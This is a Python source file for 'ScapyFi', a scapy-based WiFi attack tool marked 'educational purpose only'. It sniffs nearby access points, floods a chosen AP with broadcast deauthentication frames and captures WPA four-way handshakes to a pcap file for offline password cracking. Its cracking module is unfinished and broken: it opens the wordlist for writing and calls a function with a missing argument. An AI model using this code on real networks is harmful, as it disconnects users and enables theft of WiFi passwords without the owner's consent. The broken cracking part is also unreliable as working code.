#!/usr/bin/python

from scapy.all import *
import sys
import signal
import os
from pbkdf2 import PBKDF2

#Gloabal variables and banner:
ap_list = []
cli_list = []
to_frames = []
from_frames = []
ap_list_temp = []
temp_frames = []
temp_cli_mac = None
interface = ""
captured_handshake = False
DS_FLAG = 0b11
TO_DS = 0b01
chans = [1,2,3,4,5,6,7,8,9,10,11]
TGREEN =  '\033[32m' # Green Text
TWHITE = '\033[37m' #White (default) Text

#AP class representing an access point
class AP:
    def __init__(self,mac,ssid,channel,cipher):
        self.mac = mac
        self.ssid = ssid
        self.channel = channel
        self.cipher = cipher
        self.handshake = False
        self.frames = []
        self.client_mac = None
    def print_ap(self):
        print("MAC: " + TGREEN + self.mac + TWHITE +  " SSID: " + TGREEN + self.ssid + TWHITE + " CH: " + TGREEN + str(self.channel) + TWHITE + " CIPHER: " + TGREEN + self.cipher + TWHITE)



#Banner function
def banner():
    banner = """
 ___                    ___ _
/ __| __ __ _ _ __ _  _| __(_)
\__ \/ _/ _` | '_ \ || | _|| |
|___/\__\__,_| .__/\_, |_| |_|
             |_|   |__/

Version: 0.2
Author: Guyard Félix
Use for educational purpose only.
"""
    print(banner)
    print("+ Wifi interface in use : " + TGREEN +  str(interface) + TWHITE)
    print("\nSelect the module you want to use:")


    print("""

    [1] -> Network Sniffer
    [2] -> Handshake Grabber
    [3] -> Handshake Cracker

    Press Ctrl+c to Exit

    """)


#######################################
#   WIRELESS RELATED FUNCTIONS        #
#######################################

#Handle the ctrl+C to disable the monitoring mode and restore network adapter.
def signal_handler(signal,frame):
    print("\nDisabling monitoring mode on network adpater...",end='')
    try:
        os.system("ip link set " + interface + " down")
        os.system("iw "+ interface + " set type managed")
        os.system("ip link set " + interface +" up")
        os.system("NetworkManager")
        print(TGREEN + "done" + TWHITE)
        sys.exit(1)
    except Exception as e:
        print("Error when disabling monitor mode")
        print(e)
        sys.exit(1)

#Handle the ctrl_C signal when the user is sniffing wifi
def signal_handler2(signal,frame):
    banner()
    menu()


#Check if the user is root
def check_root():
    if not os.geteuid() == 0:
        print("You need to be root to run this tool.")
        exit(1)

#Check the argument passed to the script
def check_args():
    if(len(sys.argv) < 3):
        print("Missing argument: ScapyFi.py -i interface_name")
        exit(1)
    if(sys.argv[1] != "-i"):
        print("Argument "+ str(sys.argv[1]) + " not understood")
        print("Usage : ScapyFi.py -i interface_name")
        exit(1)
    path = "/sys/class/net/"+sys.argv[2]
    if(not os.path.exists(path)):
        print("Interface not found.")
        exit(1)

    return sys.argv[2]


#Enable monitoring mode on the given interface
def enable_monitoring(interface_name):
    print("Activating monitoring mode on " + str(interface_name) + "...",end='')
    try:
        os.system("killall wpa_supplicant")
        os.system("killall NetworkManager")
        os.system("ip link set " + interface_name + " down")
        os.system("iw "+ interface_name + " set monitor control")
        os.system("ip link set " + interface_name + " up")
        print(TGREEN + "done." + TWHITE)
    except Exception as e:
        print("Error when activating monitoring mode:")
        print(e)


# Determines the encrytption type of the AP
def get_encrytion(p):

    enc = []

    if p.subtype != 8:
        return enc

    packet = p
    if packet.haslayer(Dot11Elt):
        packet  = packet[Dot11Elt]
        while isinstance(packet, Dot11Elt):
            if packet.ID == 48:
                enc = "WPA2"
            elif packet.ID == 221 and packet.info.startswith(b'\x00P\xf2\x01\x01\x00'):
                enc = "WPA"
            packet = packet.payload

    if not enc:
        if (p.FCfield & 0b01000000 != 0):
            enc = "WEP"
        else:
            enc = "OPN"

    return enc


#802.11 Packet Handler
def packet_handler(packet):
    try:
        if packet.addr2 not in ap_list_temp and packet.type == 0 and packet.subtype == 8:
            ssid = str(packet.info)
            mac = str(packet.addr2)
            cipher = str(get_encrytion(packet))
            channel = int(ord(packet[Dot11Elt:3].info))
            ap = AP(mac,ssid,channel,cipher)
            ap_list.append(ap)
            ap_list_temp.append(packet.addr2)
            print("[+] ", end="")
            ap.print_ap()

    except Exception as e:
        print("Error getting Access Point information : ")
        print(e)



#The network sniffer simply hop between channels and sniff the wireless network around the user.
def network_sniffer():
    i= 0
    print("[INFO] Press Ctrl+c to stop the capture")
    signal.signal(signal.SIGINT,signal_handler2) #Handle the ctrl+c to not quit and return to main menu.
    while True:
        sniff(iface=interface,prn=packet_handler,count=5)
        os.system("iw dev "+ interface + " set channel %d" % chans[i])
        i = (i + 1) % len(chans)
        time.sleep(1)


#This function is going to deauth the clients on the specified AP
def deauth(ap):
    target_mac = "ff:ff:ff:ff:ff:ff" #Deauth All clients
    gateway_mac = ap.mac
    # Contructing the 802.11 frame:

    #Params :
        # addr1: destination MAC
        # addr2: source MAC
        # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)

#This function is checking if the handshake is in the packet p.
#It is saving the EAPOL paquet into a pcap file for later crack
#Return TRUE if the handshake was grabbed successfully.
#This function is used in the grab_handshake function when sniffing.
def checkForWPAHandshake(p):
    pktdump =  PcapWriter('./handshake/handshake.pcap',append=True,sync=True)
    if EAPOL in p:
        pktdump.write(p)
        DS = p.FCfield & DS_FLAG
        to_ds = p.FCfield & TO_DS != 0
        if to_ds:
            client = p.addr2 #The client send EAPOL Frame
        else:
            client = p.addr1 #The AP send EAPOL Frame
        if client not in cli_list:
            cli_list.append(client)
            print("New client identified : " + str(p.addr1) + "----HANDSHAKE--->" + str(p.addr2))
            to_frames.append(0)
            from_frames.append(0)

        idx = cli_list.index(client)
        if to_ds:
            to_frames[idx] = to_frames[idx] + 1
        else:
            from_frames[idx] = from_frames[idx] + 1
        # See if we captured 4 way handshake
        if (to_frames[idx] >= 2) and (from_frames[idx] >=2):
            captured_handshake = True
            return True

        return False

    else:
        return False

#This function is going to listen for the hanshake and try to capture it.
#Once it is captured. It will be saved into a pcap file. (use the function wrpcap)
#The pcap file can then be used to crack the password.
def grab_handshake(ap):
    os.system("clear")
    print("Switching to channel " + str(ap.channel))
    os.system("iw dev "+ interface + " set channel %d" % ap.channel)
    print("Sniffing " + ap.ssid + "...")
    p = sniff(iface=interface, stop_filter=checkForWPAHandshake) #Sniff for handshake
    print("Handshake Grabbed!")
    ap.handshake = True     # Save the fact that we have the handshake for this AP



#This is the handshake_grabber main function.
#It is asking the user to select the AP they want to sniff
#Then trigger the grab_handshake function to start the capture
def handshake_grabber():
    signal.signal(signal.SIGINT, signal.SIG_DFL)
    if len(ap_list) == 0:
        print("There is no access point sniffed yet, please start the network sniffer first.")
    else:
        i = 0
        for ap in ap_list:
            print("["+ TGREEN + str(i) + TWHITE + "] ",end="")
            ap.print_ap()
            i = i+1
        valid = False
        choice = None
        while valid == False:
            try:
                choice = int(input('Enter the target number:'))
                valid = True
                if len(ap_list) < choice or choice < 0:
                    valid = False
            except:
                print("Bad input")
        if valid == True:
            grab_handshake(ap_list[choice])

#####################################
#       CRACKING FUNCTIONS          #
#####################################
def crack_handshake(ap,wordlist):

    #First I need to bind 802.1X each field
    for i in range (0,3):
        packet = ap.frames[i]
        payload = packet[30:-4]
        eapol_frame = payload[4:]
        version = eapol_frame[0]
        eapol_frame_type = eapol_frame[1]
        body_length = eapol_frame[2:4]
        key_type = eapol_frame[4]
        key_info = eapol_frame[5:7]
        key_length = eapol_frame[7:9]
        replay_counter = eapol_frame[9:17]
        nonce = eapol_frame[17:49]
        key_iv = eapol_frame[49:65]
        key_rsc = eapol_frame[65:73]
        key_id = eapol_frame[73:81]
        mic = eapol_frame[81:97]
        wpa_key_length = eapol_frame[97:99]
        wpa_key = eapol_frame[99:]

        #I also need to isolate the nonces
        if i == 0:
            ap_nonce = nonce
        elif i == 1:
            cl_nonce = nonce
        elif i == 2:
            continue
        else:
            eapol_frame_zeroed_mic = b''.join([
                                eapol_frame[:81],
                                b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0',
                                eapol_frame[97:99]
                            ])

    dico = open(wordlist, 'w')
    print("Cracking Handshake...")




def handshake_cracker():
    i = 0
    if len(ap_list) == 0:
        print("There is no access point sniffed yet, please start the network sniffer first.")
        return
    print("Please select the AP handshake you want to crack:")
    for ap in ap_list:
        if ap.handshake == True:
            print("["+ TGREEN + str(i) + TWHITE + "] ",end="")
            ap.print_ap()
    valid = False
    choice = None
    while valid == False:
        try:
            choice = int(input('Target>'))
            valid = True
            if len(ap_list) < choice or choice < 0:
                valid = False
        except:
            print("Bad input")
    if valid == True:
        crack_handshake(ap_list[choice])



#Main menu funtion : The user can choose the module he want to execute.
def menu():
    signal.signal(signal.SIGINT,signal_handler) #Handle the ctrl+c command
    while True:
        choice = input("Module Selection :>")
        if choice == "1":
            network_sniffer()
        elif choice == "2":
            handshake_grabber()
            signal.signal(signal.SIGINT,signal_handler)
            banner()
        elif choice == "3":
            handshake_cracker()
        else:
            print("Bad Input")

#____________The main Program________________#
check_root() #Check if the user is root
interface = check_args()
os.system("clear")
banner()
enable_monitoring(interface)
menu()
